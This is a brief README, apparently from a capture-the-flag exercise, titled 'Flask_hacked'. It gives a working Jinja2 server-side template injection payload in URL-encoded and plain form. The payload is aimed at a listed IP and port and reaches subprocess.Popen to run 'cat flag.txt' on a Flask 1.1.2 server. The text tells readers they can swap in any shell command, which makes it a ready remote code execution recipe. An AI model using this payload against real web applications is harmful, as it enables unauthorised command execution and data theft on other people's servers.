# Flask_hacked
# Hi i told you about how to hack flask site
Already command:   `http://167.172.55.94:31138/%7B%7B%22%22.__class__.__mro__[1].__subclasses__()[414]%20(%22cat%20flag.txt%22,shell=True,stdout=-1).communicate()%7D%7D`

The first part is write URL 
>`167.172.55.94:31138`

Second part is write exploit and start bash command

`%7B%7B%22%22.__class__.__mro__[1].__subclasses__()[414]%20(%22cat%20flag.txt%22,shell=True,stdout=-1).communicate()%7D%7D` URL encode

`{{"".__class__.__mro__[1].__subclasses__()[414] ("cat flag.txt",shell=True,stdout=-1).communicate()}}` ASCII 

`"cat flag.txt"` is a bash command. You can write your command.

But you need Flask 1.1.2

Solve this task!
